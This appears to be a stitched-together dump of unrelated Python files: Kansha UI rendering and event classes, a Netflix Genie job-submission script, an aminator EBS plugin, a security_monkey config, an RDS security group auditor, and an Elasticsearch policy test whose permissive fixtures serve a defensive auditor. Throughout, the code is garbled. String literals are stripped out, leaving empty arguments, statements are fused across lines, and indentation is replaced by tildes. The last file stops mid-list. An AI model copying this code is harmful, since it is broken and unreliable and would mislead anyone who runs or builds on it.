~~~ submit_id = h . generate_id ( "attach_submit" ) \n 
input_id = h . generate_id ( "attach_input" ) \n 
h << h . label ( ( h . i ( class_ = ) , \n 
_ ( "Add file" ) ) , class_ = , for_ = input_id ) \n 
with h . form : \n 
~~~ h << h . script ( \n 
% \n 
{ \n 
: ajax . py2js ( self . assets_manager . max_size ) , \n 
: ajax . py2js ( input_id ) , \n 
: ajax . py2js ( submit_id ) , \n 
: ajax . py2js ( \n 
_ ( ) \n 
) . decode ( ) \n 
} \n 
) \n 
submit_action = ajax . Update ( \n 
render = lambda r : r . div ( comp . render ( r , model = None ) , r . script ( component_to_update = + self . comp_id , \n 
) \n 
\n 
h << h . input ( id = input_id , class_ = , type = "file" , name = "file" , multiple = "multiple" h << h . input ( class_ = , id = submit_id , type = "submit" ) . action ( submit_action ) \n 
~~ ~~ return h . root \n 
\n 
\n 
~~ @ presentation . render_for ( Gallery , model = ) \n 
def render_gallery_badge ( self , h , * args ) : \n 
~~~ """Gallery badge for the card""" \n 
if self . assets : \n 
~~~ with h . span ( class_ = ) : \n 
~~~ h << h . span ( h . i ( class_ = ) , , len ( self . assets ) , class_ = ) \n 
~~ ~~ return h . root \n 
\n 
\n 
~~ @ presentation . render_for ( Asset ) \n 
@ presentation . render_for ( Asset , model = ) \n 
@ presentation . render_for ( Asset , model = ) \n 
@ presentation . render_for ( Asset , model = ) \n 
def render_asset ( self , h , comp , model , * args ) : \n 
~~~ res = [ ] \n 
metadata = self . assets_manager . get_metadata ( self . filename ) \n 
kw = { : True } if model == else { } \n 
kw [ ] = model \n 
if self . is_cover : \n 
~~~ res . append ( h . span ( class_ = ) ) \n 
\n 
~~ meth = CONTENT_TYPES . get ( metadata [ ] , render_file ) \n 
res . append ( meth ( self , h , comp , model , ** kw ) ) \n 
return res \n 
\n 
~~ @ presentation . render_for ( Asset , model = ) \n 
def render_Asset_thumb ( self , h , comp , model , * args ) : \n 
~~~ with h . div ( class_ = ) : \n 
~~~ action = h . a . action ( lambda : comp . answer ( ( , self ) ) ) . get ( ) \n 
onclick = _ ( ) \n 
onclick = u\'if (confirm("%s")) { %s }\' % ( onclick , action ) \n 
with h . a ( class_ = , title = _ ( ) , href = , onclick = onclick ) : \n 
~~~ h << h . i ( class_ = ) \n 
~~ if self . is_image ( ) : \n 
~~~ with h . a ( class_ = , title = _ ( ) ) . action ( lambda : comp . answer ( ( ~~~ if self . is_cover : \n 
~~~ h << { : } \n 
~~ h << h . i ( class_ = ) \n 
~~ ~~ with h . a ( href = self . assets_manager . get_image_url ( self . filename ) , target = ) : \n 
~~~ h << comp . render ( h , ) \n 
~~ ~~ return h . root \n 
\n 
~~ @ presentation . render_for ( Asset , model = "anonymous" ) \n 
def render_asset_anonymous ( self , h , comp , model , * args ) : \n 
~~~ with h . div ( class_ = ) : \n 
~~~ with h . a ( href = self . assets_manager . get_image_url ( self . filename ) , target = ) : \n 
~~~ h << comp . render ( h , model = "thumb" ) \n 
~~ ~~ return h . root \n 
\n 
\n 
~~ @ presentation . render_for ( AssetCropper ) \n 
def render_gallery_cropper ( self , h , comp , * args ) : \n 
~~~ h << h . p ( _ ( ) ) \n 
\n 
form_id = h . generate_id ( ) \n 
img_id = h . generate_id ( ) \n 
\n 
with h . form : \n 
~~~ for crop_name in , , , : \n 
~~~ h << h . input ( type = , id = form_id + + crop_name ) . action ( getattr ( self , crop_name ~~ h << h . p ( render_image ( self . asset , h , comp , , id = img_id ) ) \n 
h << h . script ( \n 
"YAHOO.util.Event.onContentReady(%s," \n 
"function(){YAHOO.kansha.app.initCrop(%s, %s, %s, %s)})" % ( \n 
ajax . py2js ( img_id ) , \n 
ajax . py2js ( img_id ) , \n 
ajax . py2js ( form_id ) , \n 
ajax . py2js ( self . crop_width ( ) ) , \n 
ajax . py2js ( self . crop_height ( ) ) \n 
) \n 
) \n 
with h . div ( class_ = ) : \n 
~~~ h << h . button ( _ ( ) , class_ = ) . action ( self . commit , comp ) \n 
if self . asset . is_cover : \n 
~~~ h << \n 
h << h . button ( _ ( ) , class_ = ) . action ( self . remove_cover , comp ~~ h << \n 
h << h . button ( _ ( ) , class_ = ) . action ( self . cancel , comp ) \n 
~~ ~~ return h . root \n 
# -*- coding:utf-8 -*- \n 
# -- \n 
# Copyright (c) 2012-2014 Net-ng. \n 
# All rights reserved. \n 
# \n 
# This software is licensed under the BSD License, as described in \n 
# the file LICENSE.txt, which you should have received as part of \n 
# this distribution. \n 
# -- \n 
\n 
\n 
~~ class EventHandlerMixIn ( object ) : \n 
~~~ """\n    Mix-in that implements:\n      - `emit_event`, to emit an event;\n      - `handle_event`, a callback for comp.on_answer if comp is expected to emit events.\n\n      `handle_event` calls a method `on_event(event)`\n      on `self` (if exists) to handle the event and then systematically bubbles the event up.\n      `handle_event` returns the return value of `on_event`\n      if any, or the return value of the upper levels.\n    """ \n 
\n 
def emit_event ( self , comp , kind , data = None ) : \n 
~~~ event = kind ( data , source = [ self ] ) \n 
return comp . answer ( event ) \n 
\n 
~~ def handle_event ( self , comp , event ) : \n 
\n 
~~~ local_res = None \n 
local_handler = getattr ( self , , None ) \n 
if local_handler : \n 
~~~ local_res = local_handler ( comp , event ) \n 
# bubble up in any case \n 
~~ event . append ( self ) \n 
upper_res = comp . answer ( event ) \n 
# return local result in priority \n 
return local_res or upper_res \n 
\n 
\n 
~~ ~~ class Event ( object ) : \n 
~~~ """Can be derived""" \n 
\n 
def __init__ ( self , data , source = [ ] ) : \n 
~~~ """\n        `data` is a payload specific to the kind of event.\n        `source` is a list of component business objects. The first one is the emitter.\n        Each traversed component must append itself with `append` (see below).\n        """ \n 
\n 
self . _source = source \n 
self . data = data \n 
\n 
~~ @ property \n 
def source ( self ) : \n 
~~~ return self . _source . copy ( ) \n 
\n 
~~ @ property \n 
def emitter ( self ) : \n 
~~~ return self . _source [ 0 ] \n 
\n 
~~ @ property \n 
def last_relay ( self ) : \n 
~~~ return self . _source [ - 1 ] \n 
\n 
~~ def is_ ( self , kind ) : \n 
~~~ return type ( self ) is kind \n 
\n 
~~ def is_kind_of ( self , kind ) : \n 
~~~ return isinstance ( self , kind ) \n 
\n 
~~ def append ( self , relay ) : \n 
~~~ self . _source . append ( relay ) \n 
\n 
~~ def cast_as ( self , sub_kind ) : \n 
#assert(issubclass(sub_kind, self.__class__)) \n 
~~~ return sub_kind ( self . data , self . _source ) \n 
\n 
\n 
# Standard events \n 
\n 
~~ ~~ class ColumnDeleted ( Event ) : \n 
~~~ """\n    The user clicked on the \'delete column\' action.\n    `data` is the column component (component.Component).\n    """ \n 
pass \n 
\n 
\n 
~~ class CardClicked ( Event ) : \n 
~~~ """\n    The user clicked on a card.\n    `data` is the card component (component.Component)\n    """ \n 
pass \n 
\n 
\n 
~~ class PopinClosed ( Event ) : \n 
~~~ """\n    The Popin has closed.\n    `data` is the component.Component containing the Popin.\n    """ \n 
pass \n 
\n 
\n 
~~ class CardEditorClosed ( PopinClosed ) : \n 
~~~ """\n    In the particular case when the Popin contains the card editor.\n    `data` is the component.Component containing the Popin.\n    """ \n 
pass \n 
\n 
\n 
~~ class CardArchived ( Event ) : \n 
~~~ """\n    The user clicked on the `Delete` button in the card editor.\n    No payload.\n    """ \n 
pass \n 
\n 
\n 
~~ class SearchIndexUpdated ( Event ) : \n 
~~~ """\n    Some operations have been committed on the search index.\n    No payload.\n    """ \n 
pass \n 
\n 
\n 
~~ class CardDisplayed ( Event ) : \n 
~~~ """\n    A card has just been (re-)displayed on the board (default form).\n    No payload.\n    """ \n 
pass \n 
\n 
\n 
~~ class BoardAccessChanged ( Event ) : \n 
~~~ """\n    The access conditions to the board changed.\n    """ \n 
\n 
\n 
~~ class BoardDeleted ( BoardAccessChanged ) : \n 
~~~ """\n    The board has been (or is about to be) deleted.\n    No payload.\n    """ \n 
\n 
\n 
~~ class BoardArchived ( BoardAccessChanged ) : \n 
~~~ """\n    The board has been archived.\n    No payload.\n    """ \n 
\n 
\n 
~~ class BoardRestored ( BoardAccessChanged ) : \n 
~~~ """\n    The board has been restored from archive.\n    """ \n 
\n 
\n 
~~ class BoardLeft ( BoardAccessChanged ) : \n 
~~~ """\n    The user has left the board.\n    No payload.\n    """ \n 
\n 
\n 
# "Request" events \n 
~~ class ParentTitleNeeded ( Event ) : \n 
~~~ """The emitter needs context from parent in the form of a title string.""" \n 
pass \n 
\n 
\n 
~~ class NewTemplateRequested ( Event ) : \n 
~~~ """\n    The user requested that a new template is created from the emitter.\n    Payload is tuple (template_title, template_description, shared_flag).\n    The receiver returns a new Template on success.\n    """ \n 
pass \n 
#-- \n 
# Copyright (c) 2012-2014 Net-ng. \n 
# All rights reserved. \n 
# \n 
# This software is licensed under the BSD License, as described in \n 
# the file LICENSE.txt, which you should have received as part of \n 
# this distribution. \n 
#-- \n 
\n 
~~ from . comp import EditableTitle \n 
from . import view \n 
#!/usr/bin/python2.7 \n 
\n 
# Copyright 2015 Netflix, Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
####################################################################################################################### # This script assumes setup.py has already been run to configure Genie and that this script is executed on the host \n 
####################################################################################################################### \n 
import genie2 . client . wrapper \n 
import genie2 . model . ClusterCriteria \n 
import genie2 . model . Job \n 
import genie2 . model . FileAttachment \n 
import time \n 
\n 
# Create a Genie client which proxies API calls through wrapper which retries failures based on various return codes genie = genie2 . client . wrapper . Genie2 ( "http://localhost:8080/genie" , \n 
genie2 . client . wrapper . RetryPolicy ( \n 
tries = 8 , none_on_404 = True , no_retry_http_codes = range ( 400 , 500 ) ) \n 
\n 
# Create a job instance and fill in the required parameters \n 
job = genie2 . model . Job . Job ( ) \n 
job . name = "GenieDockerExamplePigJob2" \n 
job . user = "root" \n 
job . version = "0.14.0" \n 
\n 
# Create a list of cluster criterias which determine the cluster to run the job on \n 
job . clusterCriterias = list ( ) \n 
cluster_criteria = genie2 . model . ClusterCriteria . ClusterCriteria ( ) \n 
criteria = set ( ) \n 
criteria . add ( "sched:adhoc" ) \n 
criteria . add ( "type:yarn" ) \n 
cluster_criteria . tags = criteria \n 
job . clusterCriterias . append ( cluster_criteria ) \n 
\n 
# Create the set of command criteria which will determine what command Genie executes for the job \n 
command_criteria = set ( ) \n 
command_criteria . add ( "type:pig" ) \n 
job . commandCriteria = command_criteria \n 
\n 
# Add any dependencies for this job. Could use attachments but since these are already available on the system # will instead use the file dependencies field. \n 
job . fileDependencies = "file:///apps/genie/pig/0.14.0/tutorial/script2-hadoop.pig,file:///apps/genie/pig/0.14.0/tutorial/tutorial.jar" \n 
# Any command line arguments to run along with the command. \n 
job . commandArgs = "script2-hadoop.pig" \n 
\n 
# Submit the job to Genie \n 
job = genie . submitJob ( job ) \n 
\n 
while job . status != "SUCCEEDED" and job . status != "KILLED" and job . status != "FAILED" : \n 
~~~ print "Job " + job . id + " is " + job . status \n 
time . sleep ( 10 ) \n 
job = genie . getJob ( job . id ) \n 
\n 
~~ print "Job " + job . id + " finished with status " + job . status # -*- coding: utf-8 -*- \n 
\n 
# \n 
# \n 
#  Copyright 2013 Netflix, Inc. \n 
# \n 
#     Licensed under the Apache License, Version 2.0 (the "License"); \n 
#     you may not use this file except in compliance with the License. \n 
#     You may obtain a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#     Unless required by applicable law or agreed to in writing, software \n 
#     distributed under the License is distributed on an "AS IS" BASIS, \n 
#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#     See the License for the specific language governing permissions and \n 
#     limitations under the License. \n 
# \n 
# \n 
\n 
"""\naminator.plugins.finalizer.tagging_ebs\n======================================\nebs tagging image finalizer\n""" \n 
import logging \n 
\n 
from os import environ \n 
from aminator . config import conf_action \n 
from aminator . plugins . finalizer . tagging_base import TaggingBaseFinalizerPlugin \n 
from aminator . util . linux import sanitize_metadata \n 
\n 
\n 
__all__ = ( , ) \n 
log = logging . getLogger ( __name__ ) \n 
\n 
\n 
class TaggingEBSFinalizerPlugin ( TaggingBaseFinalizerPlugin ) : \n 
~~~ _name = \n 
\n 
def add_plugin_args ( self ) : \n 
~~~ tagging = super ( TaggingEBSFinalizerPlugin , self ) . add_plugin_args ( ) \n 
\n 
context = self . _config . context \n 
tagging . add_argument ( , , dest = , action = conf_action ( context . ami ) , help = \n 
~~ def _set_metadata ( self ) : \n 
~~~ super ( TaggingEBSFinalizerPlugin , self ) . _set_metadata ( ) \n 
context = self . _config . context \n 
config = self . _config . plugins [ self . full_name ] \n 
metadata = context . package . attributes \n 
ami_name = context . ami . get ( , None ) \n 
if not ami_name : \n 
~~~ ami_name = config . name_format . format ( ** metadata ) \n 
\n 
~~ context . ami . name = sanitize_metadata ( . format ( ami_name ) ) \n 
\n 
~~ def _snapshot_volume ( self ) : \n 
~~~ log . info ( ) \n 
if not self . _cloud . snapshot_volume ( ) : \n 
~~~ return False \n 
~~ log . info ( ) \n 
return True \n 
\n 
~~ def _register_image ( self , block_device_map = None , root_device = None ) : \n 
~~~ log . info ( ) \n 
config = self . _config . plugins [ self . full_name ] \n 
if block_device_map is None : \n 
~~~ block_device_map = config . default_block_device_map \n 
~~ if root_device is None : \n 
~~~ root_device = config . default_root_device \n 
~~ if not self . _cloud . register_image ( block_device_map , root_device ) : \n 
~~~ return False \n 
~~ log . info ( ) \n 
return True \n 
\n 
~~ def finalize ( self ) : \n 
~~~ log . info ( ) \n 
self . _set_metadata ( ) \n 
\n 
if not self . _snapshot_volume ( ) : \n 
~~~ log . critical ( ) \n 
return False \n 
\n 
~~ if not self . _register_image ( ) : \n 
~~~ log . critical ( ) \n 
return False \n 
\n 
~~ if not self . _add_tags ( [ , ] ) : \n 
~~~ log . critical ( ) \n 
return False \n 
\n 
~~ log . info ( ) \n 
self . _log_ami_metadata ( ) \n 
return True \n 
\n 
~~ def __enter__ ( self ) : \n 
~~~ context = self . _config . context \n 
environ [ "AMINATOR_STORE_TYPE" ] = "ebs" \n 
if context . ami . get ( "name" , None ) : \n 
~~~ environ [ "AMINATOR_AMI_NAME" ] = context . ami . name \n 
~~ return super ( TaggingEBSFinalizerPlugin , self ) . __enter__ ( ) \n 
~~ ~~ OFF = 0 \n 
ON = 1 \n 
DISCONNECTED = 20 \n 
CONNECTED = 30 \n 
\n 
DEFAULT_EVENT_VERSION = 1 \n 
DEFAULT_ACTION_VERSION = 1 #     Copyright 2014 Netflix, Inc. \n 
# \n 
#     Licensed under the Apache License, Version 2.0 (the "License"); \n 
#     you may not use this file except in compliance with the License. \n 
#     You may obtain a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#     Unless required by applicable law or agreed to in writing, software \n 
#     distributed under the License is distributed on an "AS IS" BASIS, \n 
#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#     See the License for the specific language governing permissions and \n 
#     limitations under the License. \n 
# Insert any config items here. \n 
# This will be fed into Flask/SQLAlchemy inside security_monkey/__init__.py \n 
\n 
LOG_LEVEL = "DEBUG" \n 
LOG_FILE = "/var/log/security_monkey/security_monkey-deploy.log" \n 
\n 
SQLALCHEMY_DATABASE_URI = \n 
\n 
SQLALCHEMY_POOL_SIZE = 50 \n 
SQLALCHEMY_MAX_OVERFLOW = 15 \n 
ENVIRONMENT = \n 
USE_ROUTE53 = False \n 
FQDN = \n 
API_PORT = \n 
WEB_PORT = \n 
WEB_PATH = \n 
FRONTED_BY_NGINX = True \n 
NGINX_PORT = \n 
BASE_URL = . format ( FQDN ) \n 
\n 
SECRET_KEY = \n 
\n 
MAIL_DEFAULT_SENDER = \n 
SECURITY_REGISTERABLE = True \n 
SECURITY_CONFIRMABLE = False \n 
SECURITY_RECOVERABLE = False \n 
SECURITY_PASSWORD_HASH = \n 
SECURITY_PASSWORD_SALT = \n 
SECURITY_TRACKABLE = True \n 
\n 
SECURITY_POST_LOGIN_VIEW = BASE_URL \n 
SECURITY_POST_REGISTER_VIEW = BASE_URL \n 
SECURITY_POST_CONFIRM_VIEW = BASE_URL \n 
SECURITY_POST_RESET_VIEW = BASE_URL \n 
SECURITY_POST_CHANGE_VIEW = BASE_URL \n 
\n 
\n 
SECURITY_TEAM_EMAIL = [ ] \n 
\n 
# These are only required if using SMTP instead of SES \n 
EMAILS_USE_SMTP = False # Otherwise, Use SES \n 
SES_REGION = \n 
MAIL_SERVER = \n 
MAIL_PORT = 465 \n 
MAIL_USE_SSL = True \n 
MAIL_USERNAME = \n 
MAIL_PASSWORD = \n 
\n 
WTF_CSRF_ENABLED = True \n 
WTF_CSRF_SSL_STRICT = True # Checks Referer Header. Set to False for API access. \n 
WTF_CSRF_METHODS = [ , , , ] \n 
\n 
# "NONE", "SUMMARY", or "FULL" \n 
SECURITYGROUP_INSTANCE_DETAIL = \n 
\n 
# Threads used by the scheduler. \n 
# You will likely need at least one core thread for every account being monitored. \n 
CORE_THREADS = 25 \n 
MAX_THREADS = 30 \n 
#     Copyright 2014 Netflix, Inc. \n 
# \n 
#     Licensed under the Apache License, Version 2.0 (the "License"); \n 
#     you may not use this file except in compliance with the License. \n 
#     You may obtain a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#     Unless required by applicable law or agreed to in writing, software \n 
#     distributed under the License is distributed on an "AS IS" BASIS, \n 
#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#     See the License for the specific language governing permissions and \n 
#     limitations under the License. \n 
"""\n.. module: security_monkey.auditors.rds_security_group\n    :platform: Unix\n\n.. version:: $$VERSION$$\n.. moduleauthor:: Patrick Kelley <pkelley@netflix.com> @monkeysecurity\n\n""" \n 
from security_monkey . auditor import Auditor \n 
from security_monkey . watchers . rds_security_group import RDSSecurityGroup \n 
from security_monkey . datastore import NetworkWhitelistEntry \n 
from security_monkey . auditors . security_group import _check_rfc_1918 \n 
\n 
import ipaddr \n 
\n 
class RDSSecurityGroupAuditor ( Auditor ) : \n 
~~~ index = RDSSecurityGroup . index \n 
i_am_singular = RDSSecurityGroup . i_am_singular \n 
i_am_plural = RDSSecurityGroup . i_am_plural \n 
network_whitelist = [ ] \n 
\n 
def __init__ ( self , accounts = None , debug = False ) : \n 
~~~ super ( RDSSecurityGroupAuditor , self ) . __init__ ( accounts = accounts , debug = debug ) \n 
\n 
~~ def prep_for_audit ( self ) : \n 
~~~ self . network_whitelist = NetworkWhitelistEntry . query . all ( ) \n 
\n 
~~ def _check_inclusion_in_network_whitelist ( self , cidr ) : \n 
~~~ for entry in self . network_whitelist : \n 
~~~ if ipaddr . IPNetwork ( cidr ) in ipaddr . IPNetwork ( str ( entry . cidr ) ) : \n 
~~~ return True \n 
~~ ~~ return False \n 
\n 
~~ def check_rds_ec2_rfc1918 ( self , sg_item ) : \n 
~~~ """\n        alert if non-vpc RDS SG contains RFC1918 CIDRS\n        """ \n 
tag = "Non-VPC RDS Security Group contains private RFC-1918 CIDR" \n 
severity = 8 \n 
\n 
if sg_item . config . get ( "vpc_id" , None ) : \n 
~~~ return \n 
\n 
~~ for ipr in sg_item . config . get ( "ip_ranges" , [ ] ) : \n 
~~~ cidr = ipr . get ( "cidr_ip" , None ) \n 
if cidr and _check_rfc_1918 ( cidr ) : \n 
~~~ self . add_issue ( severity , tag , sg_item , notes = cidr ) \n 
\n 
~~ ~~ ~~ def check_securitygroup_large_subnet ( self , sg_item ) : \n 
~~~ """\n        Make sure the RDS SG does not contain large networks.\n        """ \n 
tag = "RDS Security Group network larger than /24" \n 
severity = 3 \n 
for ipr in sg_item . config . get ( "ip_ranges" , [ ] ) : \n 
~~~ cidr = ipr . get ( "cidr_ip" , None ) \n 
if cidr and not self . _check_inclusion_in_network_whitelist ( cidr ) : \n 
~~~ if in cidr and not cidr == "0.0.0.0/0" and not cidr == "10.0.0.0/8" : \n 
~~~ mask = int ( cidr . split ( ) [ 1 ] ) \n 
if mask < 24 and mask > 0 : \n 
~~~ self . add_issue ( severity , tag , sg_item , notes = cidr ) \n 
\n 
~~ ~~ ~~ ~~ ~~ def check_securitygroup_zero_subnet ( self , sg_item ) : \n 
~~~ """\n        Make sure the RDS SG does not contain a cidr with a subnet length of zero.\n        """ \n 
tag = "RDS Security Group subnet mask is /0" \n 
severity = 10 \n 
for ipr in sg_item . config . get ( "ip_ranges" , [ ] ) : \n 
~~~ cidr = ipr . get ( "cidr_ip" , None ) \n 
if cidr and in cidr and not cidr == "0.0.0.0/0" and not cidr == "10.0.0.0/8" : \n 
~~~ mask = int ( cidr . split ( ) [ 1 ] ) \n 
if mask == 0 : \n 
~~~ self . add_issue ( severity , tag , sg_item , notes = cidr ) \n 
\n 
~~ ~~ ~~ ~~ def check_securitygroup_any ( self , sg_item ) : \n 
~~~ """\n        Make sure the RDS SG does not contain 0.0.0.0/0\n        """ \n 
tag = "RDS Security Group contains 0.0.0.0/0" \n 
severity = 5 \n 
for ipr in sg_item . config . get ( "ip_ranges" , [ ] ) : \n 
~~~ cidr = ipr . get ( "cidr_ip" ) \n 
if "0.0.0.0/0" == cidr : \n 
~~~ self . add_issue ( severity , tag , sg_item , notes = cidr ) \n 
return \n 
\n 
~~ ~~ ~~ def check_securitygroup_10net ( self , sg_item ) : \n 
~~~ """\n        Make sure the RDS SG does not contain 10.0.0.0/8\n        """ \n 
tag = "RDS Security Group contains 10.0.0.0/8" \n 
severity = 5 \n 
\n 
for ipr in sg_item . config . get ( "ip_ranges" , [ ] ) : \n 
~~~ cidr = ipr . get ( "cidr_ip" ) \n 
if "10.0.0.0/8" == cidr : \n 
~~~ self . add_issue ( severity , tag , sg_item , notes = cidr ) \n 
return \n 
#     Copyright 2014 Netflix, Inc. \n 
# \n 
#     Licensed under the Apache License, Version 2.0 (the "License"); \n 
#     you may not use this file except in compliance with the License. \n 
#     You may obtain a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#     Unless required by applicable law or agreed to in writing, software \n 
#     distributed under the License is distributed on an "AS IS" BASIS, \n 
#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#     See the License for the specific language governing permissions and \n 
#     limitations under the License. \n 
~~ ~~ ~~ ~~ """\n.. module: security_monkey.tests.test_elasticsearch_service\n    :platform: Unix\n\n.. version:: $$VERSION$$\n.. moduleauthor::  Mike Grima <mgrima@netflix.com>\n\n""" \n 
import json \n 
\n 
from security_monkey . datastore import NetworkWhitelistEntry , Account \n 
from security_monkey . tests import SecurityMonkeyTestCase \n 
from security_monkey import db \n 
\n 
# TODO: Make a ES test for spulec/moto, then make test cases that use it. \n 
from security_monkey . watchers . elasticsearch_service import ElasticSearchServiceItem \n 
\n 
CONFIG_ONE = { \n 
"name" : "es_test" , \n 
"policy" : json . loads ( b"""{\n        "Statement": [\n            {\n                "Action": "es:*",\n                "Effect": "Allow",\n                "Principal": {\n                  "AWS": "*"\n                },\n                "Resource": "arn:aws:es:us-east-1:012345678910:domain/es_test/*",\n                "Sid": ""\n            }\n        ],\n        "Version": "2012-10-17"\n      }\n    """ ) \n 
} \n 
\n 
CONFIG_TWO = { \n 
"name" : "es_test_2" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": "*",\n          "Action": "es:*",\n          "Resource": "arn:aws:es:us-west-2:012345678910:domain/es_test_2/*"\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
CONFIG_THREE = { \n 
"name" : "es_test_3" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "arn:aws:iam::012345678910:root"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_3/*"\n        },\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": "*",\n          "Action": "es:ESHttp*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_3/*",\n          "Condition": {\n            "IpAddress": {\n              "aws:SourceIp": [\n                "192.168.1.1/32",\n                "10.0.0.1/8"\n              ]\n            }\n          }\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
CONFIG_FOUR = { \n 
"name" : "es_test_4" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "arn:aws:iam::012345678910:root"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:us-east-1:012345678910:domain/es_test_4/*"\n        },\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": "*",\n          "Action": "es:ESHttp*",\n          "Resource": "arn:aws:es:us-east-1:012345678910:domain/es_test_4/*",\n          "Condition": {\n            "IpAddress": {\n              "aws:SourceIp": [\n                "0.0.0.0/0"\n              ]\n            }\n          }\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
CONFIG_FIVE = { \n 
"name" : "es_test_5" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "arn:aws:iam::012345678910:root"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:us-east-1:012345678910:domain/es_test_5/*"\n        },\n        {\n          "Sid": "",\n          "Effect": "Deny",\n          "Principal": {\n            "AWS": "arn:aws:iam::012345678910:role/not_this_role"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:us-east-1:012345678910:domain/es_test_5/*"\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
CONFIG_SIX = { \n 
"name" : "es_test_6" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "arn:aws:iam::012345678910:role/a_good_role"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_6/*"\n        },\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": "*",\n          "Action": "es:ESHttp*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_6/*",\n          "Condition": {\n            "IpAddress": {\n              "aws:SourceIp": [\n                "192.168.1.1/32",\n                "100.0.0.1/16"\n              ]\n            }\n          }\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
CONFIG_SEVEN = { \n 
"name" : "es_test_7" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "arn:aws:iam::012345678910:role/a_good_role"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_7/*"\n        },\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": "*",\n          "Action": "es:ESHttp*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_7/*",\n          "Condition": {\n            "IpAddress": {\n              "aws:SourceIp": [\n                "192.168.1.200/32",\n                "10.0.0.1/8"\n              ]\n            }\n          }\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
CONFIG_EIGHT = { \n 
"name" : "es_test_8" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "*"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_8/*"\n        },\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": "*",\n          "Action": "es:ESHttp*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_8/*",\n          "Condition": {\n            "IpAddress": {\n              "aws:SourceIp": [\n                "192.168.1.1/32",\n                "100.0.0.1/16"\n              ]\n            }\n          }\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
CONFIG_NINE = { \n 
"name" : "es_test_9" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "arn:aws:iam::111111111111:root"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:us-east-1:012345678910:domain/es_test_9/*"\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
\n 
WHITELIST_CIDRS = [ \n 
( "Test one" , "192.168.1.1/32" ) , \n 
( "Test two" , "100.0.0.1/16" ) , \n 
] \n 
\n 
\n 
class ElasticSearchServiceTestCase ( SecurityMonkeyTestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . es_items = [ \n 
